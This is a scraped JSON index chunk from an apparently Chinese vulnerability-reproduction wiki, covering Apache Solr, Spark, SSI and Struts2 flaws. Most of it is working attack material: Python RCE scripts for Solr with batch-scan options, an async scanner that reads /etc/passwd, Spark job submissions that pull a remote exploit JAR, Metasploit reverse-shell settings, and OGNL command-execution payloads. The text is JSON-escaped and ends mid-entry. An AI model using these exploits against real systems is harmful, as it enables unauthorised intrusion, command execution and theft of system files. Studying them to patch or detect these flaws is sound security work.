http://www.0-sec.org:8983/solr/admin/cores?indexInfo=false&wt=json { \"responseHeader\": { \"status\": 0, \"QTime\": 3 }, \"initFailures\": {}, \"status\": { \"atom\": { \"name\": \"atom\", \"instanceDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/atom\", \"dataDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/atom/data/\", \"config\": \"solrconfig.xml\", \"schema\": \"managed-schema\", \"startTime\": \"2019-11-01T07:47:08.216Z\", \"uptime\": 107753 }, \"db\": { \"name\": \"db\", \"instanceDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/db\", \"dataDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/db/data/\", \"config\": \"solrconfig.xml\", \"schema\": \"managed-schema\", \"startTime\": \"2019-11-01T07:47:09.224Z\", \"uptime\": 106745 }, \"mail\": { \"name\": \"mail\", \"instanceDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/mail\", \"dataDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/mail/data/\", \"config\": \"solrconfig.xml\", \"schema\": \"managed-schema\", \"startTime\": \"2019-11-01T07:47:06.695Z\", \"uptime\": 109273 }, \"solr\": { \"name\": \"solr\", \"instanceDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/solr\", \"dataDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/solr/data/\", \"config\": \"solrconfig.xml\", \"schema\": \"managed-schema\", \"startTime\": \"2019-11-01T07:47:06.702Z\", \"uptime\": 109267 }, \"tika\": { \"name\": \"tika\", \"instanceDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/tika\", \"dataDir\": \"/opt/solr-7.7.2/example/example-DIH/solr/tika/data/\", \"config\": \"solrconfig.xml\", \"schema\": \"managed-schema\", \"startTime\": \"2019-11-01T07:47:03.493Z\", \"uptime\": 112475 } } } 利用Burpsuite 发包 ,开启paramsresource.loader.enabled paramsresource.loader.enabled 默认是false 由于我们修改的atom目录下的配置文件，所以我们只能拿这个存在配置缺陷的接口来攻击 http://www.0-sec.org:8983/solr/atom/config ApacheSolr代码注入漏洞/media/rId30.jpg) BurpSuite request POST /solr/atom/config HTTP/1.1 Host: www.0-sec.org:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 259 Connection: close Upgrade-Insecure-Requests: 1 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solrresource.loader.enabled\": \"true\", \"paramsresource.loader.enabled\": \"true\" } } BurpSuite response HTTP/1.1 200 OK Connection: close Content-Type: application/json;charset=utf-8 Content-Length: 149 { \"responseHeader\":{ \"status\":0, \"QTime\":554}, \"WARNING\":\"This response format is experimental. It is likely to change in the future.\"} 开启后，直接Get 访问（带入表达式）进行 远程代码命令执行 http://www.0-sec.org:8983/solr/atom/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end ssit http://www.0-sec.org:8983/solr/atom/select?q=1&&wt=velocity&v.template=custom&v.template.custom= #set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end ApacheSolr代码注入漏洞/media/rId31.jpg) 注意到 状态码是400，而不是200，出现500的情况可能是 异常报错。 poc usage python solr_rce.py http://www.0-sec.org:8983 command ApacheSolr代码注入漏洞/media/rId33.jpg) #coding=utf-8 import requests import sys import json banner = ''' _ _____ _ _____ _____ ______ /\\ | | / ____| | | | __ \\ / ____| ____| / \\ _ __ __ _ ___| |__ ___ | (___ ___ | |_ __ | |__) | | | |__ / /\\ \\ | '_ \\ / _` |/ __| '_ \\ / _ \\ \\___ \\ / _ \\| | '__| | _ /| | | __| / ____ \\| |_) | (_| | (__| | | | __/ ____) | (_) | | | | | \\ \\| |____| |____ /_/ \\_\\ .__/ \\__,_|\\___|_| |_|\\___| |_____/ \\___/|_|_| |_| \\_\\\\_____|______| | | |_| Apache Solr Velocity模板远程代码执行 2019-10-30 17:30 python By Jas502n >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ''' print banner def get_code_name(url): if url[-1] == '/': url = url[:-1].split('\\n')[0] else: url = url.split('\\n')[0] core_url = url + '/solr/admin/cores?indexInfo=false&wt=json' print '[+] Querying Core Name: '+core_url,'\\n' proxies = {\"http\":\"http://127.0.0.1:8080\"} try: # r = requests.get(core_url,proxies=proxies) r = requests.get(core_url) if r.status_code == 200 and 'responseHeader' in r.content and 'status' in r.content: json_str = json.loads(r.content) for i in json_str['status']: core_name_url = url + '/solr/' + i + '/config' print core_name_url update_queryresponsewriter(core_name_url) else: print \"No core name exit!\" except: pass def update_queryresponsewriter(core_name_url): headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/json', 'Content-Length': '259', 'Connection': 'close' } payload = ''' { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solrresource.loader.enabled\": \"true\", \"paramsresource.loader.enabled\": \"true\" } }''' proxies = {\"http\":\"http://127.0.0.1:8080\"} r = requests.post(core_name_url,headers=headers,data=payload) # r = requests.post(core_name_url,headers=headers,data=payload,proxies=proxies) if r.status_code == 200 and 'responseHeader' in r.content: print \"[+] maybe enable Successful!\" exp_url = core_name_url[:-7] cmd = 'whoami' cmd = sys.argv[2] send_exp(exp_url,cmd) else: print \"[+] Enable Fail!\\n\" def send_exp(exp_url,cmd): exp_url = exp_url + r\"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + r\"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" proxies = {\"http\":\"http://127.0.0.1:8080\"} r = requests.get(exp_url) # r = requests.get(exp_url,proxies=proxies) if r.status_code == 400 or r.status_code == 500 or r.status_code ==200 and len(r.content) >0: print \">>> [+] Exp Send Successful! >>>>>>\\n',r.content else: print \"[+] EXP No Send Successful!\\n\" if __name__ == '__main__': if len(sys.argv) != 3: sys.exit(\"\\n [+] Usage: python %s http://x.x.x.x:8983 command\\n\" % sys.argv[0]) else: # url = \"http://192.168.5.86:8983\" url = sys.argv[1] get_code_name(url) # 批量 # f = open('url.txt','rb') # for i in f.readlines(): # url = i.split('\\r\\n')[0] # get_code_name(url) 参考链接 https://github.com/jas502n/solr\\_rce Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:18 "},"Web安全/Apache Solr/Apache Solr Velocity模版注入远程命令执行/Apache Solr Velocity模版注入远程命令执行.html":{"url":"Web安全/Apache Solr/Apache Solr Velocity模版注入远程命令执行/Apache Solr Velocity模版注入远程命令执行.html","title":"Apache Solr Velocity模版注入远程命令执行","keywords":"","body":"Apache Solr Velocity模版注入远程命令执行 一、漏洞简介 该漏洞的产生是由于两方面的原因： 1、当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。2、2Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的paramsresource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。当设置paramsresource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。 二、漏洞影响 经过测试，目前影响Apache Solr 8.1.1到8.2.0版本。 推测影响全版本Apache Solr。 三、复现过程 手动检测 手动检测访问http://www.0-sec.org/8983/solr/\\#/进入主界面，单击左侧的Core Selector查看集合名称 1、post发送请求 POST /solr/test/config HTTP/1.1 Host: solr:8983 Content-Type: application/json Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solrresource.loader.enabled\": \"true\", \"paramsresource.loader.enabled\": \"true\" } } 2、执行系统命令 GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: localhost:8983 使用脚本检测 auth: @l3_W0ng version: 1.0 function: Apache Solr RCE via Velocity template usage: python3 script.py ip [port [command]] default port=8983 default command=whoami note: Step1: Init Apache Solr Configuration Step2: Remote Exec in Every Solr Node \"\"\" import sys import json import time import requests class initSolr(object): timestamp_s = str(time.time()).split('.') timestamp = timestamp_s[0] + timestamp_s[1][0:-3] def __init__(self, ip, port): self.ip = ip self.port = port def get_nodes(self): payload = { '_': self.timestamp, 'indexInfo': 'false', 'wt': 'json' } url = 'http://' + self.ip + ':' + self.port + '/solr/admin/cores' try: nodes_info = requests.get(url, params=payload, timeout=5) node = list(nodes_info.json()['status'].keys()) state = 1 except: node = '' state = 0 if node: return { 'node': node, 'state': state, 'msg': 'Get Nodes Successfully' } else: return { 'node': None, 'state': state, 'msg': 'Get Nodes Failed' } def get_system(self): payload = { '_': self.timestamp, 'wt': 'json' } url = 'http://' + self.ip + ':' + self.port + '/solr/admin/info/system' try: system_info = requests.get(url=url, params=payload, timeout=5) os_name = system_info.json()['system']['name'] os_uname = system_info.json()['system']['uname'] os_version = system_info.json()['system']['version'] state = 1 except: os_name = '' os_uname = '' os_version = '' state = 0 return { 'system': { 'name': os_name, 'uname': os_uname, 'version': os_version, 'state': state } } class apacheSolrRCE(object): def __init__(self, ip, port, node, command): self.ip = ip self.port = port self.node = node self.command = command self.url = \"http://\" + self.ip + ':' + self.port + '/solr/' + self.node def init_node_config(self): url = self.url + '/config' payload = { 'update-queryresponsewriter': { 'startup': 'lazy', 'name': 'velocity', 'class': 'solr.VelocityResponseWriter', 'template.base.dir': '', 'solrresource.loader.enabled': 'true', 'paramsresource.loader.enabled': 'true' } } try: res = requests.post(url=url, data=json.dumps(payload), timeout=5) if res.status_code == 200: return { 'init': 'Init node config successfully', 'state': 1 } else: return { 'init': 'Init node config failed', 'state': 0 } except: return { 'init': 'Init node config failed', 'state': 0 } def rce(self): url = self.url + (\"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=\" \"%23set($x=%27%27)+\" \"%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+\" \"%23set($chr=$x.class.forName(%27java.lang.Character%27))+\" \"%23set($str=$x.class.forName(%27java.lang.String%27))+\" \"%23set($ex=$rt.getRuntime().exec(%27\" + self.command + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+\" \"%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\") try: res = requests.get(url=url, timeout=5) if res.status_code == 200: try: if res.json()['responseHeader']['status'] == '0': return 'RCE failed @Apache Solr node %s\\n' % self.node else: return 'RCE failed @Apache Solr node %s\\n' % self.node except: return 'RCE Successfully @Apache Solr node %s\\n %s\\n' % (self.node, res.text.strip().strip('0')) else: return 'RCE failed @Apache Solr node %s\\n' % self.node except: return 'RCE failed @Apache Solr node %s\\n' % self.node def check(ip, port='8983', command='whoami'): system = initSolr(ip=ip, port=port) if system.get_nodes()['state'] == 0: print('No Nodes Found. Remote Exec Failed!') else: nodes = system.get_nodes()['node'] systeminfo = system.get_system() os_name = systeminfo['system']['name'] os_version = systeminfo['system']['version'] print('OS Realese: %s, OS Version: %s\\nif remote exec failed, ' 'you should change your command with right os platform\\n' % (os_name, os_version)) for node in nodes: res = apacheSolrRCE(ip=ip, port=port, node=node, command=command) init_node_config = res.init_node_config() if init_node_config['state'] == 1: print('Init node %s Successfully, exec command=%s' % (node, command)) result = res.rce() print(result) else: print('Init node %s Failed, Remote Exec Failed\\n' % node) if __name__ == '__main__': usage = ('python3 script.py ip [port [command]]\\n ' '\\t\\tdefault port=8983\\n ' '\\t\\tdefault command=whoami') if len(sys.argv) == 4: ip = sys.argv[1] port = sys.argv[2] command = sys.argv[3] check(ip=ip, port=port, command=command) elif len(sys.argv) == 3: ip = sys.argv[1] port = sys.argv[2] check(ip=ip, port=port) elif len(sys.argv) == 2: ip = sys.argv[1] check(ip=ip) else: print('Usage: %s:\\n' % usage) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:15 "},"Web安全/Apache Solr/Apache-Solr 任意文件读取漏洞复现/Apache-Solr 任意文件读取漏洞复现.html":{"url":"Web安全/Apache Solr/Apache-Solr 任意文件读取漏洞复现/Apache-Solr 任意文件读取漏洞复现.html","title":"Apache-Solr 任意文件读取漏洞复现","keywords":"","body":"Apache-Solr 任意文件读取漏洞复现 =========================== 漏洞描述 Apache Solr是一个开源的搜索服务，使用Java语言开发。Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。 漏洞评级 Apache Solr stream.url SSRF与任意文件读取漏洞 中危 影响版本 Apache Solr 所有版本 安全版本 官方不予修复，暂无安全版本。 复现过程 环境搭建 docker search solr docker pull solr docker run -d -p 8983:8983 solr docker exec -it 实例id /bin/bash cp -r server/solr/configsets/_default/conf /var/solr/data/test1 参考：http://www.bubuko.com/infodetail-3118740.html 漏洞复现 首先获取core core 以my_core测试为例， POST /solr/my_core/config HTTP/1.1 Host: x.x.x.x:8983 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close Content-Length: 84 {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}} 读取文件 curl \"http://ip:8983/solr/my_core/debug/dump?param=ContentStreams\" -F \"stream.url=file:///etc/passwd\" 读取结果 EXP 环境要求：python3.8+ 使用方法：python3 solr.py --help #!/usr/bin/python # coding: UTF-8 import argparse import asyncio import json import pathlib from typing import Tuple from urllib.parse import urlparse import httpx class URLAction(argparse.Action): def __call__(self, parser, namespace, values, option_string=None): if not urlparse(values): raise ValueError(\"Not a valid url!\") setattr(namespace, self.dest, values) class FILEAction(argparse.Action): def __call__(self, parser, namespace, values, option_string=None): if not pathlib.Path(values).exists(): raise ValueError(\"File not exists!\") setattr(namespace, self.dest, values) parser = argparse.ArgumentParser(description=\"Solr Poc\") parser.add_argument(\"--host\", type=str, action=URLAction, help=\"target host uri\") parser.add_argument(\"--file\", type=str, action=FILEAction, help=\"target host file\") parser.add_argument(\"--conn\", type=int, default=10, help=\"asyncio max connetions\") args = parser.parse_args() SEM = asyncio.Semaphore(args.conn) RESULT = {} async def check(host: str) -> Tuple[str, bool]: status = False async with SEM: async with httpx.AsyncClient(base_url=host) as client: try: core_data = ( await client.get( \"/solr/admin/cores?indexInfo=false&wt=json\", timeout=3 ) ).json() except httpx.ReadTimeout: print(f\"{host} TimeOut!\") status = \"TimeOut\" else: if (status := core_data[\"status\"]) : core = status.keys()[0] await client.post( f\"/solr/{core}/config\", json={ \"set-property\": { \"requestDispatcher.requestParsers.enableRemoteStreaming\": \"true\" } }, ) result_data = ( await client.post( url=f\"/solr/{core}/debug/dump?param=ContentStreams\", data={\"stream.url\": \"file:///etc/passwd\"}, ) ).json() if (streams := result_data[\"streams\"]) : print(streams[0][\"stream\"]) status = True finally: RESULT[host] = status return host, status async def loop(urls): await asyncio.gather(*list(map(check, urls))) def main(): result_file = pathlib.Path(\"solr_main.json\") try: urls = set() if args.host: urls.add(args.host) if args.file: with pathlib.Path(args.file).open(\"r\") as file: urls = urls.union( {url for line in file if urlparse((url := line.strip()))} ) print(f\"tasks: {len(urls)}\") asyncio.run(loop(urls)) except KeyboardInterrupt: pass finally: with result_file.open(\"w\") as file: file.write(json.dumps(RESULT, indent=4, ensure_ascii=True)) 修复建议 增加身份验证/授权，可参考官方文档：https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html 禁止Solr API 以及管理 UI 直接对公网开放。设置防火墙，以便只允许受信任的计算机和人员访问。 Reference https://m.aliyun.com/doc/notice_list/9213612.html https://www.o2oxy.cn/3227.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:14 "},"Web安全/Apache Spark/Apache Spark 未授权访问漏洞/Apache Spark 未授权访问漏洞.html":{"url":"Web安全/Apache Spark/Apache Spark 未授权访问漏洞/Apache Spark 未授权访问漏洞.html","title":"Apache Spark 未授权访问漏洞","keywords":"","body":"Apache Spark 未授权访问漏洞 一、漏洞简介 Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。 二、漏洞影响 三、复现过程 方法一 该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。 提交方式有两种： 利用REST API 利用submissions网关（集成在7077端口中） 应用可以是Java或Python，就是一个最简单的类， import java.io.BufferedReader; import java.io.InputStreamReader; public class Exploit { public static void main(String[] args) throws Exception { String[] cmds = args[0].split(\",\"); for (String cmd : cmds) { System.out.println(cmd); System.out.println(executeCommand(cmd.trim())); System.out.println(\"==============================================\"); } } // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/ private static String executeCommand(String command) { StringBuilder output = new StringBuilder(); try { Process p = Runtime.getRuntime().exec(command); p.waitFor(); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { output.append(line).append(\"\\n\"); } } catch (Exception e) { e.printStackTrace(); } return output.toString(); } } 将其编译成JAR，放在任意一个HTTP或FTP上，如 https://download.0-sec.org/Web安全/Apache Spark/Apache Spark 未授权访问漏洞.jar。 用REST API方式提交应用 standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API： POST /v1/submissions/create HTTP/1.1 Host: www.0-sec.org:6066 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Content-Type: application/json Connection: close Content-Length: 680 { \"action\": \"CreateSubmissionRequest\", \"clientSparkVersion\": \"2.3.1\", \"appArgs\": [ \"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf\" ], \"appResource\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"environmentVariables\": { \"SPARK_ENV_LOADED\": \"1\" }, \"mainClass\": \"Exploit\", \"sparkProperties\": { \"spark.jars\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"spark.driver.supervise\": \"false\", \"spark.app.name\": \"Exploit\", \"spark.eventLog.enabled\": \"true\", \"spark.submit.deployMode\": \"cluster\", \"spark.master\": \"spark://your-ip:6066\" } } 其中，spark.jars即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。 返回的包中有submissionId，然后访问http://www.0-sec.org:8081/logPage/?driverId={submissionId}&logType=stdout，即可查看执行结果： 注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。 利用submissions网关 如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。 方法是利用Apache Spark自带的脚本bin/spark-submit： bin/spark-submit --master spark://www.0-sec.org:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id 如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。 查看结果的方式与前面一致。 方法二 msf5> use exploit/linux/http/spark_unauth_rce msf5> set payload java/meterpreter/reverse_tcp msf5> set rhost 被攻击ip msf5> set rport 6066 msf5> set lhost 攻击ip msf5> set lport 4444 msf5> set srvhost 1攻击ip msf5> set srvport 8080 msf5> exploit 参考链接 https://vulhub.org/\\#/environments/spark/unacc/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:20 "},"Web安全/Apache SSI/Apache SSI 远程命令执行漏洞/Apache SSI 远程命令执行漏洞.html":{"url":"Web安全/Apache SSI/Apache SSI 远程命令执行漏洞/Apache SSI 远程命令执行漏洞.html","title":"Apache SSI 远程命令执行漏洞","keywords":"","body":"Apache SSI 远程命令执行漏洞 一、漏洞简介 在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用``语法执行任意命令。 二、漏洞影响 三、复现过程 正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件： 成功上传，然后访问shell.shtml，可见命令已成功执行： 参考链接 https://vulhub.org/\\#/environments/httpd/ssi-rce/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:21 "},"Web安全/Apache Struts/（ CVE-2013-1966）（CVE-2013-2115）S2-014/（ CVE-2013-1966）（CVE-2013-2115）S2-014.html":{"url":"Web安全/Apache Struts/（ CVE-2013-1966）（CVE-2013-2115）S2-014/（ CVE-2013-1966）（CVE-2013-2115）S2-014.html","title":"（ CVE-2013-1966）（CVE-2013-2115）S2-014","keywords":"","body":"（ CVE-2013-1966）（CVE-2013-2115）S2-014 一、漏洞简介 Struts2 标签中 和 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下： none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和 POST 所有参数和其值 ``用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。 二、漏洞影响 2.0.0 - 2.3.14.1 三、复现过程 任意命令执行POC： ${(#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())} // 或 ${#_memberAccess[\"allowStaticMethodAccess\"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())} 如：http://www.0-sec.org:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D 0ZGLLQ`7TVP_D_0B3E8XDL.png S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 ${ognl_exp} OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强。 http://www.0-sec.org:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:27 "},"Web安全/Apache Struts/（CVE-2007-4556）s2-001/（CVE-2007-4556）s2-001.html":{"url":"Web安全/Apache Struts/（CVE-2007-4556）s2-001/（CVE-2007-4556）s2-001.html","title":"（CVE-2007-4556）s2-001","keywords":"","body":"（CVE-2007-4556）s2-001 一、漏洞简介 因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中 二、漏洞影响 2.0.0-2.0.8 三、复现过程 poc 图片.png %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"id\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:23 "},"Web安全/Apache Struts/（CVE-2008-6504）S2-003/（CVE-2008-6504）S2-003.html":{"url":"Web安全/Apache Struts/（CVE-2008-6504）S2-003/（CVE-2008-6504）S2-003.html","title":"（CVE-2008-6504）S2-003","keywords":"","body":"（CVE-2008-6504）S2-003 一、漏洞简介 OGNL还提供了广泛的表达式评估功能（http://www.ognl.org/2.6.9/Documentation/html/LanguageGuide/expressionEvaluation.html）。该漏洞允许恶意用户绕过ParametersInterceptor内置的\"＃\"使用保护，从而能够操纵服务器端上下文对象。所以，例如，要将＃session.user设置为\\'0wn3d\\'，可以使用以下参数名称：（\\'\\\\ u0023\\'+\\'session \\'user \\' \\'）（未使用）= 0wn3d网址编码后会显示如下：（\\'\\ u0023\\'％20％2b％20\\'session \\'user \\ \\'））（未使用）= 0wn3d 二、漏洞影响 Struts 2.0.0 - Struts 2.0.11.2 三、复现过程 其实S2-003是S2-005的前身，他的POC即为S-005的缩小版，因为S2-003之后官方偷偷修改安全配置，默认让SecurityMemberAccess(管理ognl权限的类)的allowStaticMethodAccess为false，这里简单把S2-005的POC去掉&(\\'\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue\\')(bla)(bla)这句话 ?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)&('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla)) 测试网址： http://www.0-sec.org:8080/struts2-showcase-2.0.1/showcase.action 修改后网址： http://www.0-sec.org:8080/struts2-showcase-2.0.1/showcase.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)&('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla)) 直接执行ipconfig命令 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:23 "},"Web安全/Apache Struts/（CVE-2010-1870）s2-005/（CVE-2010-1870）s2-005.html":{"url":"Web安全/Apache Struts/（CVE-2010-1870）s2-005/（CVE-2010-1870）s2-005.html","title":"（CVE-2010-1870）s2-005","keywords":"","body":"（CVE-2010-1870）s2-005 